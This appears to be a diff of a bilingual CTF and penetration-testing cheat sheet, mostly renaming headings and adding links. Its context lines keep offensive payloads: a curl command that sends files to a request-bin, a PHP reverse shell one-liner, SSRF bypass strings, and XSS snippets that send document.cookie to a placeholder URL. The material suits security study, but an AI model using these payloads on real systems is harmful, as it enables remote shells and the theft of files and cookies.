@@ -1,6 +1,6 @@
 # Tools
 
-## CTF-Tools
+## CTF Tools
 
 * [CyberShef](https://gchq.github.io/CyberChef/#input=8J%2BNo/CfjbTwn42m8J%2BMtPCfjaLwn4278J%2BNs/CfjbTwn42l8J%2BNp/CfjaHwn42u8J%2BMsPCfjafwn42y8J%2BNofCfjbDwn42o8J%2BNufCfjZ/wn42i8J%2BNufCfjZ/wn42l8J%2BNrfCfjLDwn4yw8J%2BMsPCfjLDwn4yw8J%2BMsPCfjarwn42p8J%2BNvQo)
 * [Hack Tricks](https://book.hacktricks.xyz/tunneling-and-port-forwarding)
@@ -9,7 +9,7 @@
 ### Web Shell
 * https://www.webshell.cc/4422.html
 
-### Rev Shell
+### Reverse Shell
 * [Reverse Shell大全](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) 
 * [GitHub List Rev](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
@@ -28,10 +28,6 @@
     ```
 * [PCHunter Tool](https://www.bleepingcomputer.com/download/pc-hunter/)
     * Windows系統訊息查看，輔助殺毒文件
-* Python HTTP Server
-    ```python
-    python -m http.server 8080
-    ```
 * curl 配 request-bin 傳檔
     ```bash
     (echo -n '{"payload": "'; <file>; echo '"}') | curl -H "Content-Type: application/json" -d @- <requests-bin url>
@@ -122,7 +118,7 @@ php -r '$sock=fsockopen(<ip>,<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ### SSRF繞過
 - `127.0.0.0/8`
-- redirect
+- `redirect`
 - `http://@127.0.0.1`
 
 ```
@@ -138,3 +134,7 @@ gethostbyname('@127.0.0.1') == '@127.0.0.1'
 <script>var i=new Image;i.src="<url>/?"+document.cookie;</script>
 <svg/onload="document.location='<url>/?'+document.cookie">
 ```
+
+## 滲透相關，有點東西
+
+* https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/
